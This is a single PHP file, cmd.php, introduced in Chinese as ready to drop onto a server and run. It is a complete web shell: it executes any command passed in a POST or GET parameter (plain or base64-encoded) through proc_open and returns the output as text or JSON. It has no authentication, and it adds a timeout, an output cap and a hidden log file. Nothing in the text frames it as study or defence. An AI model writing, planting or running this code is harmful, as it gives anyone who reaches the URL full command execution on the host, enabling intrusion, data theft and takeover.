`cmd.php` — single file, POST 参数直出。整段可直接落盘运行。

```php
<?php
// cmd.php — POST 系统命令执行入口（单文件，无依赖）
// 契约: POST c=<命令> ->  回显 stdout+stderr ; 可选 out=json|txt, t=超时秒, b64=1
declare(strict_types=1);

const PARAM      = 'c';                    // 主参数名
const MAX_OUT    = 8 * 1024 * 1024;       // 单次输出上限 8MB
const LOG_FILE   = __DIR__ . '/.cmd.log';  // 审计日志

// ---------- 1. 取参 ----------
$raw = $_POST[PARAM] ?? $_GET[PARAM] ?? '';
if ($raw === '' && isset($_POST['b64'])) {
    $dec = base64_decode((string)$_POST['b64'], true);
    if ($dec !== false) $raw = $dec;
}
if (trim((string)$raw) === '') {
    http_response_code(400);
    exit("missing param: " . PARAM . "\n");
}

$mode    = (string)($_REQUEST['out'] ?? 'plain');   // plain | json
$timeout = (float)($_REQUEST['t'] ?? 10.0);          // 墙钟超时
if ($timeout <= 0) $timeout = 10.0;

// ---------- 2. 组装 argv ----------
// "[ls","-la"]形式 -> 走 bypass_shell，元字符不被解析；其余按 shell 字符串执行
$argv = null;
$s = ltrim((string)$raw);
if ($s !== '' && ($s[0] === '[')) {
    $parsed = json_decode($s, true);
    if (is_array($parsed) && $parsed !== [] && array_is_list($parsed)) {
        $argv = array_map('strval', $parsed);
    }
}

$desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$opt  = $argv !== null ? ['bypass_shell' => true] : null;

$proc = proc_open($argv ?? (string)$raw, $desc, $pipes, null, null, $opt);
if (!is_resource($proc)) {
    http_response_code(500);
    exit("proc_open failed\n");
}

fclose($pipes[0]);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);

$out = ''; $deadline = microtime(true) + $timeout; $timedOut = false;

while (true) {
    $read = [];
    $w = $e = [];
    foreach ([1, 2] as $fd) { if (!feof($pipes[$fd])) $read[$fd] = $pipes[$fd]; }
    if ($read === []) break;

    $left = $deadline - microtime(true);
    if ($left <= 0) { $timedOut = true; break; }

    $sec  = (int)floor($left);
    $usec = (int)(fmod($left, 1.0) * 1_000_000);
    $n = @stream_select($read, $w, $e, $sec, $usec);
    if ($n === false) break;
    if ($n === 0) { $timedOut = true; break; }

    foreach ($read as $fd) {
        $chunk = fread($fd, 65536);
        if ($chunk === false || $chunk === '') { fclose($pipes[$fd]); continue; }
        $out .= $chunk;
        if (strlen($out) >= MAX_OUT) { $timedOut = true; break 2; }
    }
}

if ($timedOut && is_resource($proc)) {
    proc_terminate($proc, 9);          // SIGKILL 收尾，防止残留子进程
    usleep(200_000);
}
foreach ([1, 2] as $fd) { if (is_resource($pipes[$fd])) fclose($pipes[$fd]); }
$code = proc_close($proc);
$out  = substr($out, 0, MAX_OUT);

// ---------- 3. 审计 ----------
@file_put_contents(
    LOG_FILE,
    sprintf("[%s] ip=%s raw=%s rc=%d timeout=%d\n",
        gmdate('c'), $_SERVER['REMOTE_ADDR'] ?? '-',
        str_replace("\n", ' ', substr((string)$raw, 0, 512)), $code, (int)$timedOut),
    FILE_APPEND | LOCK_EX
);

// ---------- 4. 输出 ----------
if ($mode === 'json') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'cmd'     => (string)$raw,
        'code'    => $code,
        'timeout' => $timedOut,
        'stdout'  => base64_encode($out),   // base64 防二进制/编码被吃掉
    ], JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
} else {
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Cmd-Rc: ' . $code);
    echo $out;
    if (!str_ends_with($out, "\n")) echo "\n";
    if ($timedOut) echo "[+] terminated: timeout/output-limit\n";
}
```

